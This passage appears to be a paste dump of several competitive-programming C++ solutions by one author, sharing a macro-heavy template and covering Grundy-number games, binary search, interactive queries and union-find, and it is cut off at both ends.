#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
//#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 200007, LG = 19, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;


struct IOPre {
    static constexpr int TEN = 10, SZ = TEN * TEN * TEN * TEN;
    std::array<char, 4 * SZ> num;
    constexpr IOPre() : num{} {
        for (int i = 0; i < SZ; i++) {
            int n = i;
            for (int j = 3; j >= 0; j--) {
                num[i * 4 + j] = static_cast<char>(n % TEN + '0');
                n /= TEN;
            }
        }
    }
};
struct IO {
#if !HAVE_DECL_FREAD_UNLOCKED
    #define fread_unlocked fread
#endif
#if !HAVE_DECL_FWRITE_UNLOCKED
    #define fwrite_unlocked fwrite
#endif
    static constexpr int SZ = 1 << 22, LEN = 32, TEN = 10, HUNDRED = TEN * TEN,
                         THOUSAND = HUNDRED * TEN, TENTHOUSAND = THOUSAND * TEN,
                         MAGIC_MULTIPLY = 205, MAGIC_SHIFT = 11, MASK = 15,
                         TWELVE = 12, SIXTEEN = 16;
    static constexpr IOPre io_pre = {};
    std::array<char, SZ> input_buffer, output_buffer;
    int input_ptr_left, input_ptr_right, output_ptr_right;

    IO()
        : input_buffer{},
          output_buffer{},
          input_ptr_left{},
          input_ptr_right{},
          output_ptr_right{} {}
    IO(const IO&) = delete;
    IO(IO&&) = delete;
    IO& operator=(const IO&) = delete;
    IO& operator=(IO&&) = delete;

    ~IO() {
        flush();
    }

    template <class T>
    struct is_char {
        static constexpr bool value = std::is_same_v<T, char>;
    };

    template <class T>
    struct is_bool {
        static constexpr bool value = std::is_same_v<T, bool>;
    };

    template <class T>
    struct is_string {
        static constexpr bool value =
            std::is_same_v<T, std::string> || std::is_same_v<T, const char*> ||
            std::is_same_v<T, char*> || std::is_same_v<std::decay_t<T>, char*>;
    };

    template <class T, class D = void>
    struct is_custom {
        static constexpr bool value = false;
    };

    template <class T>
    struct is_custom<T, std::void_t<typename T::internal_value_type>> {
        static constexpr bool value = true;
    };

    template <class T>
    struct is_default {
        static constexpr bool value = is_char<T>::value || is_bool<T>::value ||
                                      is_string<T>::value ||
                                      std::is_integral_v<T>;
    };

    template <class T, class D = void>
    struct is_iterable {
        static constexpr bool value = false;
    };

    template <class T>
    struct is_iterable<
        T, typename std::void_t<decltype(std::begin(std::declval<T>()))>> {
        static constexpr bool value = true;
    };

    template <class T, class D = void, class E = void>
    struct is_applyable {
        static constexpr bool value = false;
    };

    template <class T>
    struct is_applyable<T, std::void_t<typename std::tuple_size<T>::type>,
                        std::void_t<decltype(std::get<0>(std::declval<T>()))>> {
        static constexpr bool value = true;
    };

    template <class T>
    static constexpr bool needs_newline = (is_iterable<T>::value ||
                                           is_applyable<T>::value) &&
                                          (!is_default<T>::value);

    template <typename T, typename U>
    struct any_needs_newline {
        static constexpr bool value = false;
    };
    template <typename T>
    struct any_needs_newline<T, std::index_sequence<>> {
        static constexpr bool value = false;
    };
    template <typename T, std::size_t I, std::size_t... Is>
    struct any_needs_newline<T, std::index_sequence<I, Is...>> {
        static constexpr bool value =
            needs_newline<decltype(std::get<I>(std::declval<T>()))> ||
            any_needs_newline<T, std::index_sequence<Is...>>::value;
    };

    inline void load() {
        memmove(std::begin(input_buffer),
                std::begin(input_buffer) + input_ptr_left,
                input_ptr_right - input_ptr_left);
        input_ptr_right =
            input_ptr_right - input_ptr_left +
            static_cast<int>(fread_unlocked(
                std::begin(input_buffer) + input_ptr_right - input_ptr_left, 1,
                SZ - input_ptr_right + input_ptr_left, stdin));
        input_ptr_left = 0;
    }

    inline void read_char(char& c) {
        if (input_ptr_left + LEN > input_ptr_right) load();
        c = input_buffer[input_ptr_left++];
    }
    inline void read_string(std::string& x) {
        char c;
        while (read_char(c), c < '!') continue;
        x = c;
        while (read_char(c), c >= '!') x += c;
    }
    template <class T>
    inline std::enable_if_t<std::is_integral_v<T>, void> read_int(T& x) {
        if (input_ptr_left + LEN > input_ptr_right) load();
        char c = 0;
        do c = input_buffer[input_ptr_left++];
        while (c < '-');
        [[maybe_unused]] bool minus = false;
        if constexpr (std::is_signed<T>::value == true)
            if (c == '-') minus = true, c = input_buffer[input_ptr_left++];
        x = 0;
        while (c >= '0')
            x = x * TEN + (c & MASK), c = input_buffer[input_ptr_left++];
        if constexpr (std::is_signed<T>::value == true)
            if (minus) x = -x;
    }

    inline void skip_space() {
        if (input_ptr_left + LEN > input_ptr_right) load();
        while (input_buffer[input_ptr_left] <= ' ') input_ptr_left++;
    }

    inline void flush() {
        fwrite_unlocked(std::begin(output_buffer), 1, output_ptr_right, stdout);
        output_ptr_right = 0;
    }

    inline void write_char(char c) {
        if (output_ptr_right > SZ - LEN) flush();
        output_buffer[output_ptr_right++] = c;
    }

    inline void write_bool(bool b) {
        if (output_ptr_right > SZ - LEN) flush();
        output_buffer[output_ptr_right++] = b ? '1' : '0';
    }

    inline void write_string(const std::string& s) {
        for (auto x : s) write_char(x);
    }

    inline void write_string(const char* s) {
        while (*s) write_char(*s++);
    }

    inline void write_string(char* s) {
        while (*s) write_char(*s++);
    }

    template <typename T>
    inline std::enable_if_t<std::is_integral_v<T>, void> write_int(T x) {
        if (output_ptr_right > SZ - LEN) flush();
        if (!x) {
            output_buffer[output_ptr_right++] = '0';
            return;
        }
        if constexpr (std::is_signed<T>::value == true)
            if (x < 0) output_buffer[output_ptr_right++] = '-', x = -x;
        int i = TWELVE;
        std::array<char, SIXTEEN> buf{};
        while (x >= TENTHOUSAND) {
            memcpy(std::begin(buf) + i,
                   std::begin(io_pre.num) + (x % TENTHOUSAND) * 4, 4);
            x /= TENTHOUSAND;
            i -= 4;
        }
        if (x < HUNDRED) {
            if (x < TEN) {
                output_buffer[output_ptr_right++] = static_cast<char>('0' + x);
            } else {
                std::uint32_t q =
                    (static_cast<std::uint32_t>(x) * MAGIC_MULTIPLY) >>
                    MAGIC_SHIFT;
                std::uint32_t r = static_cast<std::uint32_t>(x) - q * TEN;
                output_buffer[output_ptr_right] = static_cast<char>('0' + q);
                output_buffer[output_ptr_right + 1] =
                    static_cast<char>('0' + r);
                output_ptr_right += 2;
            }
        } else {
            if (x < THOUSAND) {
                memcpy(std::begin(output_buffer) + output_ptr_right,
                       std::begin(io_pre.num) + (x << 2) + 1, 3),
                    output_ptr_right += 3;
            } else {
                memcpy(std::begin(output_buffer) + output_ptr_right,
                       std::begin(io_pre.num) + (x << 2), 4),
                    output_ptr_right += 4;
            }
        }
        memcpy(std::begin(output_buffer) + output_ptr_right,
               std::begin(buf) + i + 4, TWELVE - i);
        output_ptr_right += TWELVE - i;
    }
    template <typename T_>
    IO& operator<<(T_&& x) {
        using T = typename std::remove_cv<
            typename std::remove_reference<T_>::type>::type;
        static_assert(is_custom<T>::value or is_default<T>::value or
                      is_iterable<T>::value or is_applyable<T>::value);
        if constexpr (is_custom<T>::value) {
            write_int(x.get());
        } else if constexpr (is_default<T>::value) {
            if constexpr (is_bool<T>::value) {
                write_bool(x);
            } else if constexpr (is_string<T>::value) {
                write_string(x);
            } else if constexpr (is_char<T>::value) {
                write_char(x);
            } else if constexpr (std::is_integral_v<T>) {
                write_int(x);
            }
        } else if constexpr (is_iterable<T>::value) {
            // strings are immune
            using E = decltype(*std::begin(x));
            constexpr char sep = needs_newline<E> ? '\n' : ' ';
            int i = 0;
            for (const auto& y : x) {
                if (i++) write_char(sep);
                operator<<(y);
            }
        } else if constexpr (is_applyable<T>::value) {
            // strings are immune
            constexpr char sep =
                (any_needs_newline<
                    T, std::make_index_sequence<std::tuple_size_v<T>>>::value)
                    ? '\n'
                    : ' ';
            int i = 0;
            std::apply(
                [this, &sep, &i](auto const&... y) {
                    (((i++ ? write_char(sep) : void()), this->operator<<(y)),
                     ...);
                },
                x);
        }
        return *this;
    }
    template <typename T>
    IO& operator>>(T& x) {
        static_assert(is_custom<T>::value or is_default<T>::value or
                      is_iterable<T>::value or is_applyable<T>::value);
        static_assert(!is_bool<T>::value);
        if constexpr (is_custom<T>::value) {
            typename T::internal_value_type y;
            read_int(y);
            x = y;
        } else if constexpr (is_default<T>::value) {
            if constexpr (is_string<T>::value) {
                read_string(x);
            } else if constexpr (is_char<T>::value) {
                read_char(x);
            } else if constexpr (std::is_integral_v<T>) {
                read_int(x);
            }
        } else if constexpr (is_iterable<T>::value) {
            for (auto& y : x) operator>>(y);
        } else if constexpr (is_applyable<T>::value) {
            std::apply([this](auto&... y) { ((this->operator>>(y)), ...); }, x);
        }
        return *this;
    }

    IO* tie(std::nullptr_t) {
        return this;
    }
    void sync_with_stdio(bool) {}
};
IO io;
#define cin io
#define cout io

#define int long long

const ld EPS = 1e-9, PI = 3.1415926535897;

int sign(int x) {
    if (x > 0) return 1;
    if (x < 0) return -1;
    return 0;
}

struct point {
    int x, y;
    point() : x(), y() {}
    point(int x_, int y_) : x(x_), y(y_) {}
    point operator-(point oth) const { return point(x - oth.x, y - oth.y); }
    point operator+(point oth) const { return point(x + oth.x, y + oth.y); }
    int operator*(point oth) const { return x * oth.x + y * oth.y; }
    int operator%(point oth) const { return x * oth.y - y * oth.x; }
    bool operator<(point oth) const {
        if (sign(x - oth.x)) return x < oth.x;
        if (sign(y - oth.y)) return y < oth.y;
        return false;
    }
    bool operator==(const point& oth) const { return !sign(x - oth.x) && !sign(y - oth.y);  }
    void print() { cout << '(' << x << ',' << y << ')'; }
};

template <>
struct std::hash <point> {
    ll operator()(const point p) const { return ((ll)(p.x) << 32) | p.y; }
};

bool half(point p) { return sign(p.y) < 0 || (!sign(p.y) && sign(p.x) < 0); }
bool cmp(const point p1, const point p2) {
    if (half(p1) != half(p2)) return half(p1) < half(p2);
    if (p1 % p2) return sign(p1 % p2) > 0;
    return p1 * p1 < p2 * p2;
}

int n, m, q;
// grundy
bitset <10001> used;
int cur, gf[10001];
// geom
point pts[10001];
unordered_map <point, int> sec;
// ds
int cc, cnt[10001];
set <pii> segs; // [l; r)

void add(const point p) {
    int i;
    if (sec.find(p) != sec.end()) i = sec[p];
    else {
        i = lower_bound(pts, pts + n, p, cmp) - pts;
        if (i == n) i = 0;
        sec[p] = i;
    }
    if (!cnt[i]++) {
        auto it = segs.lower_bound({i, 0}), pit = segs.end();
        bool fw = 0, bw = 0;
        if (it != segs.end() && i + 1 == it->F) fw = 1;
        if (it != segs.begin() && prev(it)->S == i) {
            pit = prev(it);
            bw = 1;
        }
        if (fw && bw) {
            cur ^= gf[it->S - it->F];
            cur ^= gf[pit->S - pit->F];
            cur ^= gf[it->S - pit->F];
            segs.insert({pit->F, it->S});
            segs.erase(pit);
            segs.erase(it);

        }
        else if (fw) {
            cur ^= gf[it->S - it->F];
            cur ^= gf[it->S - it->F + 1];
            segs.insert({i, it->S});
            segs.erase(it);
        }
        else if (bw) {
            cur ^= gf[pit->S - pit->F];
            cur ^= gf[pit->S - pit->F + 1];
            segs.insert({pit->F, i + 1});
            segs.erase(pit);
        }
        else {
            cur ^= gf[1];
            segs.insert({i, i + 1});
        }
        cc++;
    }
}

void del(const point p) {
    int i;
    if (sec.find(p) != sec.end()) i = sec[p];
    else {
        i = lower_bound(pts, pts + n, p, cmp) - pts;
        if (i == n) i = 0;
        sec[p] = i;
    }
    if (!--cnt[i]) {
        auto it = prev(segs.lower_bound({i + 1, 0}));
        cur ^= gf[it->S - it->F];
        if (it->F < i) {
            cur ^= gf[i - it->F];
            segs.insert({it->F, i});
        }
        if (i + 1 < it->S) {
            cur ^= gf[it->S - (i + 1)];
            segs.insert({i + 1, it->S});
        }
        segs.erase(it);
        cc--;
    }
}

bool get() {
    if (cc == n) return !gf[n - 2];
    int w = cur;
    if (cc && prev(segs.end())->S == n && segs.begin()->F == 0) {
        int l1 = prev(segs.end())->S - prev(segs.end())->F, l2 = segs.begin()->S - segs.begin()->F;
        w ^= gf[l1];
        w ^= gf[l2];
        w ^= gf[l1 + l2];
    }
    return !!w;
}

signed main() {
    gf[0] = 0, gf[1] = 1;
    FOR(i, 2, 10001) {
        used.set();
        used.reset(gf[i - 1]);
        FOR(j, 0, i / 2) used.reset(gf[j] ^ gf[i - 2 - j]);
        gf[i] = used._Find_first();
    }
    fastIO;
    cin >> n >> m >> q;
    point o; cin >> o.x >> o.y;
    FOR(i, 0, n) cin >> pts[i].x >> pts[i].y, pts[i] = pts[i] - o;
    sort(pts, pts + n, cmp);
    FOR(i, 0, m) {
        point p; cin >> p.x >> p.y;
        add(p - o);
    }
    cout << (get() ? ""Alice\n"" : ""Bob\n"");
    while (q--) {
        char op; point p; cin >> op >> p.x >> p.y;
        if (op == '+') add(p - o);
        else del(p - o);
        cout << (get() ? ""Alice\n"" : ""Bob\n"");
    }
}
"
Nz9uFNJz,openol G 100,tiom4eg,C++,Tuesday 16th of January 2024 01:43:28 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 200007, LG = 19, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;


signed main() {
    fastIO;
    int n, a, b; cin >> n >> a >> b;
    vi t(n); EACH(e, t) cin >> e, ++e;
    sort(all(t));
    if (t.back() <= 0) return !(cout << 0);
    if (n == 1) return !(cout << (t[0] + a - 1) / a);
    if (a == b) {
        if (t.back() <= 0) cout << 0;
        else cout << (t.back() + a - 1) / a;
        return 0;
    }
    if (a < b) {
        int d = b - a;
        int l = 0, r = 2 * INF;
        while (l < r - 1) {
            int m = (l + r) / 2, c = 0;
            if (t[n - 1] - b * m > 0) {
                l = m;
                continue;
            }
            FOR(i, 0, n) {
                int w = t[i] - b * m;
                c += -w / d;
                if (c >= m) break;
            }
            (c >= m ? r : l) = m;
        }
        cout << r;
    }
    else {
        int d = a - b;
        int l = 0, r = 2 * INF;
        while (l < r - 1) {
            int m = (l + r) / 2, c = 0;
            FOR(i, 0, n) {
                int w = t[i] - b * m;
                if (w >= 0) c += (w + d - 1) / d;
                if (c > m) break;
            }
            (c > m ? l : r) = m;
        }
        cout << r;
    }
}
"
sf39FG7i,openol F 91,tiom4eg,C++,Tuesday 16th of January 2024 01:42:49 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
//#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 100007, LG = 19, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;
#undef endl


int group;

struct opi {
    int f, s;
    opi() {}
    opi(int x, int y) : f(min(x, y)), s(max(x, y)) {}
    bool operator<(const opi o) const { return (f == o.f) ? (s < o.s) : (f < o.f); }
    bool operator==(const opi o) const { return f == o.f && s == o.s; }
};

template<>
struct std::hash <opi> {
	int operator() (opi p) const { return p.f << 16 + p.s; }
};

/*
global ideas:
good vertex: vertex which doesn't have two found outgoing edges
bad vertex: vertex which has 2+ outgoing edges
first-priority edge: non-asked edge between two good vertices
second-priority edge: non-asked edge which isn't first-priority
*/


/*
idea: try every first-priority edge while they exist, their number is <= 2n
after that (it can be proven) we're left with no more than 3 good vertices
bruteforce them in 3n
*/
void solve_5n() {
    int n; cin >> n;
    vi cnt(n);
    unordered_set <opi> kal;

    function <int(opi)> ask = [](opi e) {
        cout << ""? "" << e.f + 1 << ' ' << e.s + 1 << endl;
        string r; cin >> r;
        return r[0] != 'f';
    };

    FOR(i, 0, n) {
        FOR(j, i + 1, n) {
            if (cnt[i] > 1) break;
            if (cnt[j] > 1) continue;
            opi cur(i, j);
            kal.insert(cur);
            int d = ask(cur);
            ++cnt[d ? cur.s : cur.f];
        }
    }

    FOR(v, 0, n) if (cnt[v] < 2) {
        bool ok = 1;
        FOR(u, 0, n) if (u != v && kal.find({u, v}) == kal.end()) {
            opi cur(v, u);
            kal.insert(cur);
            int d = ask(cur);
            if (v == (d ? cur.s : cur.f)) {
                if (++cnt[v] == 2) {
                    ok = 0;
                    break;
                }
            }
        }
        if (ok) {
            cout << ""! "" << v + 1 << endl;
            string verdict; cin >> verdict;
            return;
        }
    }
    cout << ""! -1"" << endl;
    string verdict; cin >> verdict;
}

void solve_kukarek() {
    int n; cin >> n;
    bitset <250000> used;
    vi cnt(n);
    set <pii> q;
    FOR(i, 0, n) q.insert({cnt[i], i});

    function <int(opi)> ask = [](opi e) {
        cout << ""? "" << e.f + 1 << ' ' << e.s + 1 << endl;
        string r; cin >> r;
        return r[0] != 'f';
    };

    FOR(iter, 0, 2000) {
        pii cur = *q.begin(), now;
        if (cur.F > 1) break;
        q.erase(q.begin());
        bool found = 0;
        for (auto it = q.begin(); it != q.end(); ++it) {
            if (!used[cur.S * n + it->S]) {
                now = *it;
                cout << ""? "" << cur.S + 1 << ' ' << now.S + 1 << endl;
                string r; cin >> r;
                int d = r[0] != 'f';
                if (d) {
                    q.erase(it);
                    cnt[now.S]++;
                    q.insert({cnt[now.S], now.S});
                }
                else ++cnt[cur.S];
                q.insert({cnt[cur.S], cur.S});
                used[cur.S * n + now.S] = used[now.S * n + cur.S] = 1;
                found = 1;
                break;
            }
        }
        if (!found) {
            cout << ""! "" << cur.S + 1 << endl;
            string verdict; cin >> verdict;
            return;
        }
    }
    cout << ""! -1"" << endl;
    string verdict; cin >> verdict;
}

signed main() {
    fastIO;
    int tc; cin >> group >> tc;
    while (tc--) solve_kukarek();
}
"
DGR0etsZ,openol E 100,tiom4eg,C++,Tuesday 16th of January 2024 01:41:03 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng2(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
//#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 100007, LG = 19, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;

pii edg[MAX];
set <int> comp[8];
int col[MAX];

int p[MAX];

int get(int v) {
    while (p[v] != v) v = p[v];
    return v;
}

const int THR = 20;

int used[MAX];
vi gr[MAX];
void dfs(int v) {
    used[v] = 1;
    EACH(u, gr[v]) if (!used[u]) dfs(u);
}

vi sm;
bool found;

void rec(int i) {
    if (found) return;
    if (i == sz(sm)) {
        found = 1;
        return;
    }
    EACH(e, comp[sm[i]]) {
        int u = get(edg[e].F), v = get(edg[e].S);
        if (u != v) {
            p[u] = v;
            rec(i + 1);
            p[u] = u;
        }
    }
}


signed main() {
    fastIO;
    int n, m, k; cin >> n >> m >> k;
    FOR(i, 0, n) p[i] = i;
    FOR(i, 0, m) {
        int u, v, c; cin >> u >> v >> c, --u, --v, --c;
        edg[i] = {u, v};
        comp[c].insert(i), col[i] = c;
        gr[u].pb(v), gr[v].pb(u);
    }
    dfs(0);
    bool govno = 0;
    FOR(i, 0, n) govno |= !used[i];
    int q; cin >> q;
    if (n - 1 < k || govno) {
        FOR(i, 0, q) cout << ""No\n"";
        return 0;
    }
    while (q--) {
        int i, c; cin >> i >> c, --i, --c;
        if (col[i] != c) {
            comp[col[i]].erase(i);
            col[i] = c;
            comp[col[i]].insert(i);
        }
        bool bad = 0;
        sm.clear();
        FOR(c, 0, k) {
            if (comp[c].empty()) {
                cout << ""No\n"";
                bad = 1;
                break;
            }
            if (sz(comp[c]) <= THR) sm.pb(c);
        }
        if (bad) continue;
        if (sz(sm) <= 1) {
            cout << ""Yes\n"";
            continue;
        }
        sort(all(sm), [&comp](int i, int j){ return sz(comp[i]) < sz(comp[j]); });
        found = 0;
        rec(0);
        cout << (found ? ""Yes\n"" : ""No\n"");
    }
}
"
SLdejsjB,openol D 100,tiom4eg,C++,Tuesday 16th of January 2024 01:40:26 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 200007, LG = 19, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;


signed main() {
    fastIO;
    int n, t, s; cin >> n >> t >> s;
    vi a(n);
    EACH(e, a) cin >> e;
    function <int(int)> f = [&](int x) { return x >= t ? 0 : (t - x + s - 1) / s; };
    map <int, int> c, p, l, r;
    EACH(e, a) ++c[f(e)];
    for (auto it = c.begin(); it != c.end(); ++it) {
        p[it->F] = it->S;
        if (it != c.begin()) p[it->F] += p[prev(it)->F];
    }
    // min
    for (auto it = c.begin(); it != c.end(); ++it) {
        if (it == c.begin()) l[it->F] = 0;
        else l[it->F] = l[prev(it)->F] + min(it->F - prev(it)->F, p[prev(it)->F] - l[prev(it)->F]);
    }
    // max
    RFOR(i, n - 1, 0) {
        int cf = f(a[i]);
        int delay = n - 1 - i - l[cf];
        r[a[i]] = a.end() - lower_bound(all(a), t - s * (cf + delay)) - 1;
    }
    int q; cin >> q;
    while (q--) {
        int d, i; cin >> d >> i, --i;
        cout << (l[f(d)] <= i && i <= r[d] ? ""Yes\n"" : ""No\n"");
    }
}
"
1BmTfAPC,openol C 30,tiom4eg,C++,Tuesday 16th of January 2024 01:39:48 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 5007, LG = 18, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;

bitset <MAX> used;
unordered_set <int> g[MAX], gg[MAX];

int dp[MAX], cnt[MAX];
void calc(int v) {
    used[v] = 1, dp[v] = 0, cnt[v] = 1;
    EACH(u, g[v]) {
        if (!used[u]) calc(u);
        dp[v] += dp[u] + cnt[u], cnt[v] += cnt[u];
    }
}

int need;
vi path;
bool dfs(int v, int p = -1) {
    if (v == need) {
        path.pb(v);
        return 1;
    }
    EACH(u, gg[v]) if (u != p) {
        if (dfs(u, v)) {
            path.pb(v);
            return 1;
        }
    }
    return 0;
}

int n, m, q;

ll get() {
    used.reset();
    ll ans = 0;
    FOR(i, 0, n) {
        if (!used[i]) calc(i);
        ans += dp[i];
    }
    return ans;
}


int cur = 0;
inline int F(int n) { return n * (n + 1) * (n + 2) / 6; }

set <pii> d[2];
void print() {
    cout << ""first\n"";
    EACH(e, d[0]) cout << e.F << ' ' << e.S << endl;
    cout << ""second\n"";
    EACH(e, d[1]) cout << e.F << ' ' << e.S << endl;
}

int inside(int l1, int r1, int l2, int r2) { return l2 <= l1 && r1 <= r2; }

void del(int k, int l, int r) {
    auto it1 = d[k].lower_bound({l, 0}), it2 = d[k].lower_bound({r, 0});
    if (it1 != d[k].begin() && prev(it1)->S > l) --it1;
    if (it1 == d[k].end()) return;
    if (inside(l, r, it1->F, it1->S)) {
        int lb = it1->F, rb = it1->S;
        cur -= F(it1->S - it1->F);
        d[k].erase(it1);
